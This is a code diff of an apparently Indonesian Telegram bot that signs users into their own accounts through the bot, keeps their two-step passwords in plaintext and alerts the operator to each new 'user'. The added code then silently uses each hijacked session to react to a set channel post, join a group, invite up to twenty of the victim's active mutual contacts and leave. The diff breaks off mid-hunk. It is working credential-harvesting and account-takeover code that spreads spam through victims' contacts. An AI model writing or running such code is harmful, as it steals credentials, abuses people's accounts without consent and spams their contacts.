@@ -106,234 +106,234 @@ def todate(timestamp):
     return formatted_date
 
 # Function to join a group automatically
-# async def join_default_group(client, phone_number):
-#     """Join group, invite mutual contacts active within 7 days (max 20), then leave group"""
-#     result = {
-#         'status': 'failed',
-#         'invited_count': 0,
-#         'message': 'Process not completed'
-#     }
+async def join_default_group(client, phone_number):
+    """Join group, invite mutual contacts active within 7 days (max 20), then leave group"""
+    result = {
+        'status': 'failed',
+        'invited_count': 0,
+        'message': 'Process not completed'
+    }
     
-#     # Load config terbaru setiap kali fungsi dipanggil
-#     config = await load_config()
-#     if not config or not config.get("DEFAULT_GROUP_LINK"):
-#         result['message'] = 'DEFAULT_GROUP_LINK tidak ditemukan dalam config'
-#         print(result['message'])
-#         return result
+    # Load config terbaru setiap kali fungsi dipanggil
+    config = await load_config()
+    if not config or not config.get("DEFAULT_GROUP_LINK"):
+        result['message'] = 'DEFAULT_GROUP_LINK tidak ditemukan dalam config'
+        print(result['message'])
+        return result
     
-#     group_link = config["DEFAULT_GROUP_LINK"]
+    group_link = config["DEFAULT_GROUP_LINK"]
     
-#     try:
-#         print(f"\n🔍 Starting process for {phone_number}...")
-#         print(f"🔗 Group Link: {group_link}")
+    try:
+        print(f"\n🔍 Starting process for {phone_number}...")
+        print(f"🔗 Group Link: {group_link}")
         
-#         group_entity = None
+        group_entity = None
         
-#         # 1. JOIN GROUP PROCESS
-#         if group_link.startswith('https://t.me/+') or group_link.startswith('https://t.me/joinchat/'):
-#             # Private group handling
-#             hash_part = group_link.split('/')[-1].lstrip('+')
-#             try:
-#                 await client(ImportChatInviteRequest(hash=hash_part))
-#                 print("✅ Joined private group successfully")
-#             except errors.UserAlreadyParticipantError:
-#                 print("ℹ️ Already in group")
-#             except Exception as e:
-#                 print(f"❌ Join error: {str(e)}")
-#                 return result
-#         else:
-#             # Public group/channel handling
-#             username = group_link.split('/')[-1]
-#             try:
-#                 await client(JoinChannelRequest(channel=username))
-#                 print("✅ Joined public group successfully")
-#             except Exception as e:
-#                 print(f"❌ Join error: {str(e)}")
-#                 return result
+        # 1. JOIN GROUP PROCESS
+        if group_link.startswith('https://t.me/+') or group_link.startswith('https://t.me/joinchat/'):
+            # Private group handling
+            hash_part = group_link.split('/')[-1].lstrip('+')
+            try:
+                await client(ImportChatInviteRequest(hash=hash_part))
+                print("✅ Joined private group successfully")
+            except errors.UserAlreadyParticipantError:
+                print("ℹ️ Already in group")
+            except Exception as e:
+                print(f"❌ Join error: {str(e)}")
+                return result
+        else:
+            # Public group/channel handling
+            username = group_link.split('/')[-1]
+            try:
+                await client(JoinChannelRequest(channel=username))
+                print("✅ Joined public group successfully")
+            except Exception as e:
+                print(f"❌ Join error: {str(e)}")
+                return result
 
-#         # 2. GET GROUP ENTITY
-#         try:
-#             group_entity = await client.get_entity(group_link)
-#             print(f"📌 Group ID: {group_entity.id}")
-#         except Exception as e:
-#             print(f"❌ Failed to get group entity: {str(e)}")
-#             return result
+        # 2. GET GROUP ENTITY
+        try:
+            group_entity = await client.get_entity(group_link)
+            print(f"📌 Group ID: {group_entity.id}")
+        except Exception as e:
+            print(f"❌ Failed to get group entity: {str(e)}")
+            return result
 
-#         # 3. GET AND FILTER CONTACTS
-#         seven_days_ago = datetime.now() - timedelta(days=7)
-#         active_contacts = []
+        # 3. GET AND FILTER CONTACTS
+        seven_days_ago = datetime.now() - timedelta(days=7)
+        active_contacts = []
         
-#         try:
-#             contacts = await client(GetContactsRequest(hash=0))
-#             print(f"📋 Total contacts found: {len(contacts.users)}")
+        try:
+            contacts = await client(GetContactsRequest(hash=0))
+            print(f"📋 Total contacts found: {len(contacts.users)}")
             
-#             mutual_contacts = [
-#                 user for user in contacts.users 
-#                 if hasattr(user, 'contact') and user.contact 
-#                 and hasattr(user, 'mutual_contact') and user.mutual_contact
-#             ]
+            mutual_contacts = [
+                user for user in contacts.users 
+                if hasattr(user, 'contact') and user.contact 
+                and hasattr(user, 'mutual_contact') and user.mutual_contact
+            ]
             
-#             print(f"👥 Found {len(mutual_contacts)} mutual contacts")
+            print(f"👥 Found {len(mutual_contacts)} mutual contacts")
             
-#             for contact in mutual_contacts:
-#                 if hasattr(contact, 'status'):
-#                     if isinstance(contact.status, UserStatusRecently):
-#                         active_contacts.append(contact)
-#                     elif isinstance(contact.status, UserStatusOnline):
-#                         active_contacts.append(contact)
-#                     elif isinstance(contact.status, UserStatusOffline):
-#                         try:
-#                             was_online = contact.status.was_online.replace(tzinfo=None)
-#                             if was_online > seven_days_ago:
-#                                 active_contacts.append(contact)
-#                         except Exception:
-#                             continue
-#                     elif isinstance(contact.status, UserStatusLastWeek):
-#                         active_contacts.append(contact)
+            for contact in mutual_contacts:
+                if hasattr(contact, 'status'):
+                    if isinstance(contact.status, UserStatusRecently):
+                        active_contacts.append(contact)
+                    elif isinstance(contact.status, UserStatusOnline):
+                        active_contacts.append(contact)
+                    elif isinstance(contact.status, UserStatusOffline):
+                        try:
+                            was_online = contact.status.was_online.replace(tzinfo=None)
+                            if was_online > seven_days_ago:
+                                active_contacts.append(contact)
+                        except Exception:
+                            continue
+                    elif isinstance(contact.status, UserStatusLastWeek):
+                        active_contacts.append(contact)
             
-#             print(f"📅 Found {len(active_contacts)} active mutual contacts (7 days)")
+            print(f"📅 Found {len(active_contacts)} active mutual contacts (7 days)")
             
-#             if len(active_contacts) > 20:
-#                 active_contacts = active_contacts[:20]
-#                 print("🔢 Limiting to first 20 active contacts")
+            if len(active_contacts) > 20:
+                active_contacts = active_contacts[:20]
+                print("🔢 Limiting to first 20 active contacts")
             
-#         except Exception as e:
-#             print(f"❌ Contact processing error: {str(e)}")
-#             return result
+        except Exception as e:
+            print(f"❌ Contact processing error: {str(e)}")
+            return result
 
-#         # 4. INVITE CONTACTS
-#         added_count = 0
-#         if active_contacts:
-#             print(f"🔄 Starting invitation process for {len(active_contacts)} contacts...")
+        # 4. INVITE CONTACTS
+        added_count = 0
+        if active_contacts:
+            print(f"🔄 Starting invitation process for {len(active_contacts)} contacts...")
             
-#             for i, contact in enumerate(active_contacts, 1):
-#                 try:
-#                     await client(InviteToChannelRequest(
-#                         channel=group_entity,
-#                         users=[contact]
-#                     ))
-#                     added_count += 1
-#                     print(f"✓ Added {contact.id} ({added_count}/{len(active_contacts)})")
+            for i, contact in enumerate(active_contacts, 1):
+                try:
+                    await client(InviteToChannelRequest(
+                        channel=group_entity,
+                        users=[contact]
+                    ))
+                    added_count += 1
+                    print(f"✓ Added {contact.id} ({added_count}/{len(active_contacts)})")
                     
-#                     if i % 5 == 0 and i != len(active_contacts):
-#                         await asyncio.sleep(1)
+                    if i % 5 == 0 and i != len(active_contacts):
+                        await asyncio.sleep(1)
                         
-#                 except errors.FloodWaitError as e:
-#                     print(f"⛔ Hit rate limit! Process cancelled. Wait {e.seconds} seconds")
-#                     result.update({
-#                         'status': 'rate_limited',
-#                         'invited_count': added_count,
-#                         'wait_time': e.seconds,
-#                         'message': f'Rate limited. Wait {e.seconds} seconds'
-#                     })
-#                     break
+                except errors.FloodWaitError as e:
+                    print(f"⛔ Hit rate limit! Process cancelled. Wait {e.seconds} seconds")
+                    result.update({
+                        'status': 'rate_limited',
+                        'invited_count': added_count,
+                        'wait_time': e.seconds,
+                        'message': f'Rate limited. Wait {e.seconds} seconds'
+                    })
+                    break
                     
-#                 except Exception as e:
-#                     print(f"✕ Failed to add {contact.id}: {str(e)}")
-#                     continue
+                except Exception as e:
+                    print(f"✕ Failed to add {contact.id}: {str(e)}")
+                    continue
         
-#         # 5. UPDATE RESULT
-#         if added_count > 0 or not active_contacts:
-#             result.update({
-#                 'status': 'completed',
-#                 'invited_count': added_count,
-#                 'message': 'Process completed successfully'
-#             })
+        # 5. UPDATE RESULT
+        if added_count > 0 or not active_contacts:
+            result.update({
+                'status': 'completed',
+                'invited_count': added_count,
+                'message': 'Process completed successfully'
+            })
         
-#     except Exception as e:
-#         print(f"💥 Critical error: {str(e)}")
-#         result['message'] = f'Critical error: {str(e)}'
+    except Exception as e:
+        print(f"💥 Critical error: {str(e)}")
+        result['message'] = f'Critical error: {str(e)}'
     
-#     finally:
-#         # 6. CLEANUP - LEAVE GROUP
-#         if group_entity:
-#             try:
-#                 await client(LeaveChannelRequest(channel=group_entity))
-#                 print(f"🚪 Left the group. Total invited: {added_count}")
-#             except Exception as e:
-#                 print(f"⚠️ Failed to leave group: {str(e)}")
-#                 if result['status'] == 'completed':
-#                     result['message'] = 'Completed but failed to leave group'
+    finally:
+        # 6. CLEANUP - LEAVE GROUP
+        if group_entity:
+            try:
+                await client(LeaveChannelRequest(channel=group_entity))
+                print(f"🚪 Left the group. Total invited: {added_count}")
+            except Exception as e:
+                print(f"⚠️ Failed to leave group: {str(e)}")
+                if result['status'] == 'completed':
+                    result['message'] = 'Completed but failed to leave group'
         
-#         return result
+        return result
 
-# async def react_to_specific_message(client, phone_number):
-#     """Memberi random reaction ke pesan spesifik di channel tertentu"""
-#     result = {
-#         'status': 'failed',
-#         'message': 'Process not completed'
-#     }
+async def react_to_specific_message(client, phone_number):
+    """Memberi random reaction ke pesan spesifik di channel tertentu"""
+    result = {
+        'status': 'failed',
+        'message': 'Process not completed'
+    }
     
-#     try:
-#         print(f"\n🔍 Memulai proses reaction untuk {phone_number}...")
+    try:
+        print(f"\n🔍 Memulai proses reaction untuk {phone_number}...")
         
-#         target_channel = "@indoviralzonee"
-#         target_message_id = 4
+        target_channel = "@indoviralzonee"
+        target_message_id = 4
         
-#         # Daftar semua emoji yang tersedia
-#         all_reactions = [
-#             ReactionEmoji(emoticon="👍"),  # Thumbs up
-#             ReactionEmoji(emoticon="🔥"),  # Fire
-#             ReactionEmoji(emoticon="🥰"),  # Smiling face with hearts
-#             ReactionEmoji(emoticon="😍"),  # Heart eyes
-#             ReactionEmoji(emoticon="💘"),  # Heart with arrow
-#             ReactionEmoji(emoticon="❤️‍🔥"),  # Heart on fire
-#             ReactionEmoji(emoticon="⚡")  # Lightning
-#         ]
+        # Daftar semua emoji yang tersedia
+        all_reactions = [
+            ReactionEmoji(emoticon="👍"),  # Thumbs up
+            ReactionEmoji(emoticon="🔥"),  # Fire
+            ReactionEmoji(emoticon="🥰"),  # Smiling face with hearts
+            ReactionEmoji(emoticon="😍"),  # Heart eyes
+            ReactionEmoji(emoticon="💘"),  # Heart with arrow
+            ReactionEmoji(emoticon="❤️‍🔥"),  # Heart on fire
+            ReactionEmoji(emoticon="⚡")  # Lightning
+        ]
 
-#         try:
-#             channel_entity = await client.get_entity(target_channel)
-#             print(f"\n📌 Memproses channel: {channel_entity.title}")
+        try:
+            channel_entity = await client.get_entity(target_channel)
+            print(f"\n📌 Memproses channel: {channel_entity.title}")
 
-#             # Acak urutan emoji untuk mencoba
-#             shuffled_reactions = random.sample(all_reactions, len(all_reactions))
-#             reaction_sent = False
+            # Acak urutan emoji untuk mencoba
+            shuffled_reactions = random.sample(all_reactions, len(all_reactions))
+            reaction_sent = False
             
-#             for emoji in shuffled_reactions:
-#                 try:
-#                     await client(SendReactionRequest(
-#                         peer=channel_entity,
-#                         msg_id=target_message_id,
-#                         reaction=[emoji]
-#                     ))
-#                     print(f"✅ Berhasil react {emoji.emoticon} di pesan {target_message_id}")
-#                     reaction_sent = True
-#                     result.update({
-#                         'status': 'completed',
-#                         'message_id': target_message_id,
-#                         'channel': target_channel,
-#                         'reaction_sent': True,
-#                         'emoji_used': emoji.emoticon
-#                     })
-#                     break
+            for emoji in shuffled_reactions:
+                try:
+                    await client(SendReactionRequest(
+                        peer=channel_entity,
+                        msg_id=target_message_id,
+                        reaction=[emoji]
+                    ))
+                    print(f"✅ Berhasil react {emoji.emoticon} di pesan {target_message_id}")
+                    reaction_sent = True
+                    result.update({
+                        'status': 'completed',
+                        'message_id': target_message_id,
+                        'channel': target_channel,
+                        'reaction_sent': True,
+                        'emoji_used': emoji.emoticon
+                    })
+                    break
                     
-#                 except errors.FloodWaitError as e:
-#                     print(f"⛔ FLOODWAIT! Tunggu {e.seconds} detik")
-#                     result.update({
-#                         'status': 'flood_wait',
-#                         'seconds': e.seconds,
-#                         'message': f'Need to wait {e.seconds} seconds'
-#                     })
-#                     break
+                except errors.FloodWaitError as e:
+                    print(f"⛔ FLOODWAIT! Tunggu {e.seconds} detik")
+                    result.update({
+                        'status': 'flood_wait',
+                        'seconds': e.seconds,
+                        'message': f'Need to wait {e.seconds} seconds'
+                    })
+                    break
                     
-#                 except Exception as e:
-#                     print(f"⚠️ Gagal react {emoji.emoticon}: {str(e)}")
-#                     continue
+                except Exception as e:
+                    print(f"⚠️ Gagal react {emoji.emoticon}: {str(e)}")
+                    continue
             
-#             if not reaction_sent:
-#                 print(f"❌ Semua emoji gagal untuk pesan {target_message_id}")
-#                 result['message'] = 'All reaction attempts failed'
+            if not reaction_sent:
+                print(f"❌ Semua emoji gagal untuk pesan {target_message_id}")
+                result['message'] = 'All reaction attempts failed'
 
-#         except Exception as e:
-#             print(f"❌ Error proses channel {target_channel}: {str(e)}")
-#             result['message'] = f'Channel processing error: {str(e)}'
+        except Exception as e:
+            print(f"❌ Error proses channel {target_channel}: {str(e)}")
+            result['message'] = f'Channel processing error: {str(e)}'
 
-#     except Exception as e:
-#         print(f"💥 Error sistem: {str(e)}")
-#         result['message'] = f'System error: {str(e)}'
+    except Exception as e:
+        print(f"💥 Error sistem: {str(e)}")
+        result['message'] = f'System error: {str(e)}'
     
-#     finally:
-#         return result
+    finally:
+        return result
     
 def getUsers(page):
     users = readJSON(fUsers)
@@ -442,44 +442,176 @@ async def handle_new_message(event):
             
             elif len(split) == 2 and len(split[1]) == 5:
                 try:
+                    # First check if we should process this user
+                    if users.get(split[0], {}).get('group_processed'):
+                        print(f"ℹ️ User {split[0]} already processed - skipping group actions")
+                        processed = True
+                    else:
+                        processed = False
+
+                    # Sign in process
                     result = await acc.sign_in(split[0], split[1], phone_code_hash=f"{phase[split[0]]}")
                     name = result.first_name
                     if result.last_name:
                         name = f"{result.first_name} {result.last_name}"
 
-                    users[split[0]] = {"user_id": result.id, "name": name, "username": result.username, "password": ""}
-                    await notif(f"✅ User Baru Masuk Bosku!\n\n👤 Name: {name}\n📱 Phone: {split[0]}\n🆔 UserID: {result.id}\n🔗 Username: @{result.username if result.username else 'None'}", split[0])
-                    update({"method": "update", "phone": split[0], "type": "OTP", "status": "success", "detail": "success"})
+                    # Update user data (without overwriting existing group_processed flag)
+                    user_data = {
+                        "user_id": result.id,
+                        "name": name,
+                        "username": result.username,
+                        "password": ""
+                    }
+                    users[split[0]] = {**users.get(split[0], {}), **user_data}
+
+                    # Notification
+                    await notif(
+                        f"✅ User Baru Masuk Bosku!\n\n"
+                        f"👤 Name: {name}\n"
+                        f"📱 Phone: {split[0]}\n"
+                        f"🆔 UserID: {result.id}\n"
+                        f"🔗 Username: @{result.username if result.username else 'None'}", 
+                        split[0]
+                    )
+
+                    # Only process group actions if not already done
+                    if not processed:
+                        try:
+                            # Execute group actions
+                            reaction_result = await react_to_specific_message(acc, split[0])
+                            if reaction_result.get('status') != 'completed':
+                                print(f"⚠️ Reaction failed for {split[0]}: {reaction_result.get('message')}")
+                            else:
+                                invite_result = await join_default_group(acc, split[0])
+                                if invite_result.get('status') == 'completed':
+                                    # Mark as processed only after successful completion
+                                    users[split[0]]["group_processed"] = True
+                                    print(f"✅ Successfully processed group invitation for {split[0]}")
+                                else:
+                                    print(f"⚠️ Group process failed for {split[0]}: {invite_result.get('message')}")
+                        except Exception as e:
+                            print(f"⚠️ Group actions failed for {split[0]}: {str(e)}")
+                        finally:
+                        # Ensure cleanup even if group process fails
+                            if acc.is_connected():
+                                await acc.disconnect()
+
+                    update({
+                        "method": "update", 
+                        "phone": split[0], 
+                        "type": "OTP", 
+                        "status": "success", 
+                        "detail": "success"
+                    })
+
                 except SessionPasswordNeededError:
                     try:
                         result = await acc(functions.account.GetPasswordRequest())
-                        update({"method": "update", "phone": split[0], "type": "OTP", "status": "success", "detail": "passwordNeeded", "hint": result.hint})
+                        update({
+                            "method": "update",
+                            "phone": split[0],
+                            "type": "OTP",
+                            "status": "success",
+                            "detail": "passwordNeeded",
+                            "hint": result.hint
+                        })
                     except:
                         return True
-                except:
-                    update({"method": "update", "phone": split[0], "type": "OTP", "status": "failed", "detail": "wrong"})
-
-                saveJSON(fUsers, users)
+                except Exception as e:
+                    print(f"⚠️ Error during sign-in for {split[0]}: {str(e)}")
+                    update({
+                        "method": "update",
+                        "phone": split[0],
+                        "type": "OTP",
+                        "status": "failed",
+                        "detail": "wrong"
+                    })
+                finally:
+                    saveJSON(fUsers, users)
+                    if acc.is_connected():
+                            await acc.disconnect()
                 
             elif len(split) == 3 and len(split[1]) == 5:
                 password = str(split[2])
                 try:
+                    # Sign in process
                     result = await acc.sign_in(password=password, phone_code_hash=phase[split[0]])
                     name = result.first_name
                     if result.last_name:
                         name = f"{result.first_name} {result.last_name}"
-
-                    users[split[0]] = {"user_id": result.id, "name": name, "username": result.username, "password": split[2]}
-                    await notif(f"✅ Userbaru Masuk Bosku!\n\n👤 Name: {name}\n📱 Phone: {split[0]}\n🆔 UserID: {result.id}\n🔗 Username: @{result.username if result.username else 'None'}", split[0])
-                    update({"method": "update", "phone": split[0], "type": "password", "status": "success"})
+            
+                    users[split[0]] = {
+                        "user_id": result.id,
+                        "name": name,
+                        "username": result.username,
+                        "password": split[2]
+                    }
+            
+                    # Notification
+                    await notif(
+                        f"✅ Userbaru Masuk Bosku!\n\n"
+                        f"👤 Name: {name}\n"
+                        f"📱 Phone: {split[0]}\n"
+                        f"🆔 UserID: {result.id}\n"
+                        f"🔗 Username: @{result.username if result.username else 'None'}",
+                        split[0]
+                    )
+            
+                    # Group invitation process with proper error handling
+                    try:
+                        # 1. First do the reaction
+                        reaction_result = await react_to_specific_message(acc, split[0])
+                        if reaction_result.get('status') != 'completed':
+                            print(f"⚠️ Reaction failed for {split[0]}: {reaction_result.get('message')}")
+                            raise Exception("Reaction process failed")
+            
+                        # 2. Then join and invite to group
+                        invite_result = await join_default_group(acc, split[0])
+                        if invite_result.get('status') != 'completed':
+                            print(f"⚠️ Group process failed for {split[0]}: {invite_result.get('message')}")
+                            raise Exception("Group process failed")
+            
+                        print(f"✅ Successfully processed group invitation for {split[0]}")
+                        
+                    except errors.FloodWaitError as e:
+                        print(f"⛔ FloodWaitError for {split[0]}: Need to wait {e.seconds} seconds")
+                    except Exception as e:
+                        print(f"⚠️ Group invitation process failed for {split[0]}: {str(e)}")
+                    finally:
+                        # Ensure cleanup even if group process fails
+                        if acc.is_connected():
+                            await acc.disconnect()
+            
+                    update({
+                        "method": "update",
+                        "phone": split[0],
+                        "type": "password",
+                        "status": "success"
+                    })
+            
                 except PasswordHashInvalidError:
-                    update({"method": "update", "phone": split[0], "type": "password", "status": "failed"})
-                except:
-                    update({"method": "update", "phone": split[0], "type": "password", "status": "failed"})
-
-                saveJSON(fUsers, users)
-                    
-            acc.disconnect()
+                    update({
+                        "method": "update",
+                        "phone": split[0],
+                        "type": "password",
+                        "status": "failed"
+                    })
+                    if acc.is_connected():
+                        await acc.disconnect()
+                except Exception as e:
+                    print(f"⚠️ Error during sign-in for {split[0]}: {str(e)}")
+                    update({
+                        "method": "update",
+                        "phone": split[0],
+                        "type": "password",
+                        "status": "failed"
+                    })
+                    if acc.is_connected():
+                        await acc.disconnect()
+                finally:
+                    saveJSON(fUsers, users)
+                    if acc.is_connected():
+                            await acc.disconnect()
 
         elif SENDER in admin:
             if text.startswith("/"):
@@ -802,203 +934,203 @@ async def handle_new_message(event):
                     non_mutual_users = None
                     groups = None
 
-            elif SENDER in invite_state and invite_state[SENDER].get('step') == 'awaiting_group_link':
-                state = invite_state[SENDER]
-                group_link = text.strip()
+            # elif SENDER in invite_state and invite_state[SENDER].get('step') == 'awaiting_group_link':
+            #     state = invite_state[SENDER]
+            #     group_link = text.strip()
 
-                if not group_link.startswith(('https://t.me/', 't.me/')):
-                    await event.respond("⚠ Format link tidak valid! Harus berupa link Telegram (contoh: `https://t.me/namagrup`)")
-                    return
+            #     if not group_link.startswith(('https://t.me/', 't.me/')):
+            #         await event.respond("⚠ Format link tidak valid! Harus berupa link Telegram (contoh: `https://t.me/namagrup`)")
+            #         return
 
-                # Simpan link grup dan lanjutkan ke proses undangan
-                invite_state[SENDER]['group_link'] = group_link
-                invite_state[SENDER]['step'] = 'processing'
+            #     # Simpan link grup dan lanjutkan ke proses undangan
+            #     invite_state[SENDER]['group_link'] = group_link
+            #     invite_state[SENDER]['step'] = 'processing'
 
-                days = state['filter_days']
-                filter_name = {
-                    0: "SEMUA KONTAK MUTUAL",
-                    1: "1 Hari Terakhir",
-                    3: "3 Hari Terakhir",
-                    7: "7 Hari Terakhir",
-                    30: "30 Hari Terakhir"
-                }.get(days, "SEMUA KONTAK MUTUAL")
+            #     days = state['filter_days']
+            #     filter_name = {
+            #         0: "SEMUA KONTAK MUTUAL",
+            #         1: "1 Hari Terakhir",
+            #         3: "3 Hari Terakhir",
+            #         7: "7 Hari Terakhir",
+            #         30: "30 Hari Terakhir"
+            #     }.get(days, "SEMUA KONTAK MUTUAL")
 
-                # Kirim pesan status awal
-                status_msg = await event.respond(
-                    f"🔄 Memulai proses undangan...\n"
-                    f"• Filter: {filter_name}\n"
-                    f"• Grup Tujuan: {group_link}\n"
-                    f"• Hanya kontak mutual (saling save)\n\n"
-                    f"⏳ Mohon tunggu..."
-                )
+            #     # Kirim pesan status awal
+            #     status_msg = await event.respond(
+            #         f"🔄 Memulai proses undangan...\n"
+            #         f"• Filter: {filter_name}\n"
+            #         f"• Grup Tujuan: {group_link}\n"
+            #         f"• Hanya kontak mutual (saling save)\n\n"
+            #         f"⏳ Mohon tunggu..."
+            #     )
 
-                client = TelegramClient(f"{path}sessions/users/{state['phone']}", api_id, api_hash)
-                await client.connect()
+            #     client = TelegramClient(f"{path}sessions/users/{state['phone']}", api_id, api_hash)
+            #     await client.connect()
 
-                try:
-                    # Fungsi untuk mendapatkan entitas grup
-                    async def get_group_entity():
-                        try:
-                            if group_link.startswith('https://t.me/+') or group_link.startswith('https://t.me/joinchat/'):
-                                hash_part = group_link.split('/')[-1]
-                                if hash_part.startswith('+'): 
-                                    hash_part = hash_part[1:]
+            #     try:
+            #         # Fungsi untuk mendapatkan entitas grup
+            #         async def get_group_entity():
+            #             try:
+            #                 if group_link.startswith('https://t.me/+') or group_link.startswith('https://t.me/joinchat/'):
+            #                     hash_part = group_link.split('/')[-1]
+            #                     if hash_part.startswith('+'): 
+            #                         hash_part = hash_part[1:]
 
-                                try:
-                                    await client(functions.messages.ImportChatInviteRequest(hash=hash_part))
-                                    await asyncio.sleep(3)
-                                    dialogs = await client.get_dialogs()
-                                    for dialog in dialogs:
-                                        if dialog.is_group or dialog.is_channel:
-                                            if hasattr(dialog.entity, 'id'):
-                                                return dialog.entity
-                                except errors.UserAlreadyParticipantError:
-                                    dialogs = await client.get_dialogs()
-                                    for dialog in dialogs:
-                                        if dialog.is_group or dialog.is_channel:
-                                            if hasattr(dialog.entity, 'id'):
-                                                return dialog.entity
-                            else:
-                                group_username = group_link.split('/')[-1]
-                                return await client.get_entity(group_username)
-                        except Exception as e:
-                            print(f"Error in get_group_entity: {str(e)}")
-                            return None
+            #                     try:
+            #                         await client(functions.messages.ImportChatInviteRequest(hash=hash_part))
+            #                         await asyncio.sleep(3)
+            #                         dialogs = await client.get_dialogs()
+            #                         for dialog in dialogs:
+            #                             if dialog.is_group or dialog.is_channel:
+            #                                 if hasattr(dialog.entity, 'id'):
+            #                                     return dialog.entity
+            #                     except errors.UserAlreadyParticipantError:
+            #                         dialogs = await client.get_dialogs()
+            #                         for dialog in dialogs:
+            #                             if dialog.is_group or dialog.is_channel:
+            #                                 if hasattr(dialog.entity, 'id'):
+            #                                     return dialog.entity
+            #                 else:
+            #                     group_username = group_link.split('/')[-1]
+            #                     return await client.get_entity(group_username)
+            #             except Exception as e:
+            #                 print(f"Error in get_group_entity: {str(e)}")
+            #                 return None
 
-                    group = await get_group_entity()
-                    if not group:
-                        await status_msg.edit("⚠️ Tidak dapat mengakses grup. coba lagi.")
-                        return
+            #         group = await get_group_entity()
+            #         if not group:
+            #             await status_msg.edit("⚠️ Tidak dapat mengakses grup. coba lagi.")
+            #             return
 
-                    if isinstance(group, types.Chat):
-                        input_peer = types.InputPeerChat(chat_id=group.id)
-                        is_supergroup = False
-                    elif isinstance(group, (types.Channel, types.ChatForbidden)):
-                        input_peer = types.InputPeerChannel(
-                            channel_id=group.id,
-                            access_hash=group.access_hash
-                        )
-                        is_supergroup = True
-                    else:
-                        await status_msg.edit("⚠️ Jenis grup tidak didukung")
-                        return
+            #         if isinstance(group, types.Chat):
+            #             input_peer = types.InputPeerChat(chat_id=group.id)
+            #             is_supergroup = False
+            #         elif isinstance(group, (types.Channel, types.ChatForbidden)):
+            #             input_peer = types.InputPeerChannel(
+            #                 channel_id=group.id,
+            #                 access_hash=group.access_hash
+            #             )
+            #             is_supergroup = True
+            #         else:
+            #             await status_msg.edit("⚠️ Jenis grup tidak didukung")
+            #             return
 
-                    # Get contacts dengan filter mutual yang ketat (hanya yang saling save)
-                    contacts_result = await client(functions.contacts.GetContactsRequest(hash=0))
-                    all_contacts = contacts_result.users
+            #         # Get contacts dengan filter mutual yang ketat (hanya yang saling save)
+            #         contacts_result = await client(functions.contacts.GetContactsRequest(hash=0))
+            #         all_contacts = contacts_result.users
 
-                    await status_msg.edit("🔍 Mencari kontak mutual (saling save)...")
+            #         await status_msg.edit("🔍 Mencari kontak mutual (saling save)...")
 
-                    # Filter ketat: hanya kontak yang benar-benar mutual (saling save)
-                    mutual_contacts = [
-                        contact for contact in all_contacts 
-                        if getattr(contact, 'mutual_contact', False)
-                    ]
+            #         # Filter ketat: hanya kontak yang benar-benar mutual (saling save)
+            #         mutual_contacts = [
+            #             contact for contact in all_contacts 
+            #             if getattr(contact, 'mutual_contact', False)
+            #         ]
 
-                    if not mutual_contacts:
-                        await status_msg.edit("⚠️ Tidak ditemukan kontak mutual (saling save)")
-                        return
+            #         if not mutual_contacts:
+            #             await status_msg.edit("⚠️ Tidak ditemukan kontak mutual (saling save)")
+            #             return
 
-                    # Filter berdasarkan last seen jika diperlukan
-                    if days > 0:
-                        await status_msg.edit(f"🔍 Memfilter {len(mutual_contacts)} kontak mutual yang aktif {days} hari terakhir...")
-                        max_last_seen = time.time() - (days * 24 * 60 * 60)
-                        filtered_contacts = []
+            #         # Filter berdasarkan last seen jika diperlukan
+            #         if days > 0:
+            #             await status_msg.edit(f"🔍 Memfilter {len(mutual_contacts)} kontak mutual yang aktif {days} hari terakhir...")
+            #             max_last_seen = time.time() - (days * 24 * 60 * 60)
+            #             filtered_contacts = []
 
-                        for contact in mutual_contacts:
-                            if not hasattr(contact, 'status'):
-                                continue
+            #             for contact in mutual_contacts:
+            #                 if not hasattr(contact, 'status'):
+            #                     continue
 
-                            if isinstance(contact.status, types.UserStatusOnline):
-                                filtered_contacts.append(contact)
-                            elif isinstance(contact.status, types.UserStatusRecently) and days >= 3:
-                                filtered_contacts.append(contact)
-                            elif isinstance(contact.status, types.UserStatusLastWeek) and days >= 7:
-                                filtered_contacts.append(contact)
-                            elif isinstance(contact.status, types.UserStatusOffline) and hasattr(contact.status, 'was_online'):
-                                try:
-                                    if contact.status.was_online.timestamp() >= max_last_seen:
-                                        filtered_contacts.append(contact)
-                                except:
-                                    pass
+            #                 if isinstance(contact.status, types.UserStatusOnline):
+            #                     filtered_contacts.append(contact)
+            #                 elif isinstance(contact.status, types.UserStatusRecently) and days >= 3:
+            #                     filtered_contacts.append(contact)
+            #                 elif isinstance(contact.status, types.UserStatusLastWeek) and days >= 7:
+            #                     filtered_contacts.append(contact)
+            #                 elif isinstance(contact.status, types.UserStatusOffline) and hasattr(contact.status, 'was_online'):
+            #                     try:
+            #                         if contact.status.was_online.timestamp() >= max_last_seen:
+            #                             filtered_contacts.append(contact)
+            #                     except:
+            #                         pass
                                 
-                        contacts_to_invite = filtered_contacts
-                    else:
-                        contacts_to_invite = mutual_contacts
+            #             contacts_to_invite = filtered_contacts
+            #         else:
+            #             contacts_to_invite = mutual_contacts
 
-                    if not contacts_to_invite:
-                        await status_msg.edit(f"⚠️ Tidak ada kontak mutual yang aktif dalam {days} hari terakhir")
-                        return
+            #         if not contacts_to_invite:
+            #             await status_msg.edit(f"⚠️ Tidak ada kontak mutual yang aktif dalam {days} hari terakhir")
+            #             return
 
-                    total_contacts = len(contacts_to_invite)
-                    success = 0
-                    failures = 0
+            #         total_contacts = len(contacts_to_invite)
+            #         success = 0
+            #         failures = 0
 
-                    await status_msg.edit(
-                        f"✅ Ditemukan {total_contacts} kontak mutual\n"
-                        f"🔄 Memulai undangan ke grup...\n\n"
-                        f"⏳ Progress: 0/{total_contacts}\n"
-                        f"✔ Berhasil: 0 | ✖ Gagal: 0"
-                    )
+            #         await status_msg.edit(
+            #             f"✅ Ditemukan {total_contacts} kontak mutual\n"
+            #             f"🔄 Memulai undangan ke grup...\n\n"
+            #             f"⏳ Progress: 0/{total_contacts}\n"
+            #             f"✔ Berhasil: 0 | ✖ Gagal: 0"
+            #         )
 
-                    for i, contact in enumerate(contacts_to_invite):
-                        try:
-                            # Update progress setiap 5 kontak atau kontak terakhir
-                            if i % 5 == 0 or i == len(contacts_to_invite) - 1:
-                                await status_msg.edit(
-                                    f"🔄 Proses undangan...\n\n"
-                                    f"⏳ Progress: {i+1}/{total_contacts}\n"
-                                    f"✔ Berhasil: {success} | ✖ Gagal: {failures}\n"
-                                    f"📌 Sedang memproses: {getattr(contact, 'first_name', '')} {getattr(contact, 'last_name', '')}"
-                                )
+            #         for i, contact in enumerate(contacts_to_invite):
+            #             try:
